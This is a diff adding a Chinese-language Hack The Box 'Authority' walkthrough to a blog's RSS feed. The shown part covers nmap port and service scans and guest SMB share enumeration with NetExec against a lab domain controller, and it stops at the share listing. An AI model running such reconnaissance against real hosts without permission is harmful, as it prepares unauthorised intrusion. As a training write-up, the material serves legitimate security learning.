@@ -5,8 +5,736 @@
         <description>Recent content in Posts on Welcome My Hack&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Fri, 23 Oct 2026 14:00:00 +0800</lastBuildDate>
+        <lastBuildDate>Tue, 03 Nov 2026 14:00:00 +0800</lastBuildDate>
         <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB-AuthorityWriteup</title>
+            <link>http://localhost:1313/posts/htb-authority-writeup/</link>
+            <pubDate>Tue, 03 Nov 2026 14:00:00 +0800</pubDate>
+            
+            <guid>http://localhost:1313/posts/htb-authority-writeup/</guid>
+            <description>&lt;h2 id=&#34;nmap-探测&#34;&gt;Nmap 探测&lt;/h2&gt;
+&lt;p&gt;使用 nmap 探测开放的 tcp 端口。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Work/Kali/Authority&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ sudo nmap --min-rate &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt; -p- 10.129.229.56 -oA Nmap/ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sudo&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; password &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; kali:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.98 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2026-11-02 01:57 -0500
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: 10.129.229.56 giving up on port because retransmission cap hit &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.229.56
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.14s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;50956&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;reset&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14550&lt;/span&gt; filtered tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no-response&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT      STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;53/tcp    open  domain
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp    open  http
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;88/tcp    open  kerberos-sec
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;135/tcp   open  msrpc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;139/tcp   open  netbios-ssn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;389/tcp   open  ldap
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;445/tcp   open  microsoft-ds
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;464/tcp   open  kpasswd5
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;593/tcp   open  http-rpc-epmap
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;636/tcp   open  ldapssl
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3268/tcp  open  globalcatLDAP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3269/tcp  open  globalcatLDAPssl
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5985/tcp  open  wsman
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8443/tcp  open  https-alt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;9389/tcp  open  adws
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;47001/tcp open  winrm
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49664/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49665/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49666/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49667/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49671/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49674/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49675/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49676/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49686/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49696/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49701/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;56426/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;57294/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 50.69 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Work/Kali/Authority&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ grep open Nmap/ports.nmap | awk -F &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{print $1}&amp;#39;&lt;/span&gt; | paste -sd &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49686,49696,49701,56426,57294
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对存活的端口进行详细信息扫描。&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="nmap-探测">Nmap 探测</h2>
+<p>使用 nmap 探测开放的 tcp 端口。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.229.56 -oA Nmap/ports
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-11-02 01:57 -0500
+</span></span><span style="display:flex;"><span>Warning: 10.129.229.56 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>10<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.56
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">50956</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">14550</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp    open  domain
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
+</span></span><span style="display:flex;"><span>8443/tcp  open  https-alt
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws
+</span></span><span style="display:flex;"><span>47001/tcp open  winrm
+</span></span><span style="display:flex;"><span>49664/tcp open  unknown
+</span></span><span style="display:flex;"><span>49665/tcp open  unknown
+</span></span><span style="display:flex;"><span>49666/tcp open  unknown
+</span></span><span style="display:flex;"><span>49667/tcp open  unknown
+</span></span><span style="display:flex;"><span>49671/tcp open  unknown
+</span></span><span style="display:flex;"><span>49674/tcp open  unknown
+</span></span><span style="display:flex;"><span>49675/tcp open  unknown
+</span></span><span style="display:flex;"><span>49676/tcp open  unknown
+</span></span><span style="display:flex;"><span>49686/tcp open  unknown
+</span></span><span style="display:flex;"><span>49696/tcp open  unknown
+</span></span><span style="display:flex;"><span>49701/tcp open  unknown
+</span></span><span style="display:flex;"><span>56426/tcp open  unknown
+</span></span><span style="display:flex;"><span>57294/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 50.69 seconds
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ grep open Nmap/ports.nmap | awk -F <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#e6db74">&#39;{print $1}&#39;</span> | paste -sd <span style="color:#e6db74">&#39;,&#39;</span>
+</span></span><span style="display:flex;"><span>53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49686,49696,49701,56426,57294
+</span></span></code></pre></div><p>对存活的端口进行详细信息扫描。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sT -sC -sV -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49686,49696,49701,56426,57294 10.129.229.56 -oA Nmap/details
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-11-02 02:00 -0500
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.56
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.48s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: IIS Windows Server
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2026-11-02 10:59:40Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-08-09T23:03:21
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-08-09T23:13:21
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-11-02T11:01:13+00:00; +3h58m41s from scanner time.
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-08-09T23:03:21
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-08-09T23:13:21
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-11-02T11:01:14+00:00; +3h58m41s from scanner time.
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-11-02T11:01:13+00:00; +3h58m41s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-08-09T23:03:21
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-08-09T23:13:21
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-08-09T23:03:21
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-08-09T23:13:21
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-11-02T11:01:14+00:00; +3h58m41s from scanner time.
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>8443/tcp  open  ssl/http      Apache Tomcat <span style="color:#f92672">(</span>language: en<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| tls-alpn:
+</span></span><span style="display:flex;"><span>|_  h2
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html;charset<span style="color:#f92672">=</span>ISO-8859-1<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>172.16.2.118
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-10-31T10:46:49
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-11-01T22:25:13
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49671/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49675/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49676/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49686/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49696/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49701/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>56426/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>57294/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1709</span> - 21H2 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> 21H1 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Vista SP1 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Longhorn <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2026-11-02T11:00:58
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3.1.1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 3h58m40s, deviation: 0s, median: 3h58m40s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 108.26 seconds
+</span></span></code></pre></div><p>将暴露出来的域名解析至 hosts 文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tail -n <span style="color:#ae81ff">1</span> /etc/hosts
+</span></span><span style="display:flex;"><span>10.129.229.56 authority.htb authority.htb.corp htb.corp HTB
+</span></span></code></pre></div><h2 id="pwn">PWN</h2>
+<p>打开 8443 端口的 WEB 界面，发现一个 PWN 应用。</p>
+<p><img src="Pasted%20image%2020261102153647.png" alt=""></p>
+<p>以 guest 身份可以列举出 smb 共享文件，其中包含一个可读文件夹 Department。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.229.56 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:AUTHORITY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:authority.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> authority.htb<span style="color:#ae81ff">\:</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.229.56 -u <span style="color:#e6db74">&#39;enil&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:AUTHORITY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:authority.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> authority.htb<span style="color:#ae81ff">\e</span>nil: <span style="color:#f92672">(</span>Guest<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        Department Shares
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        Development     READ
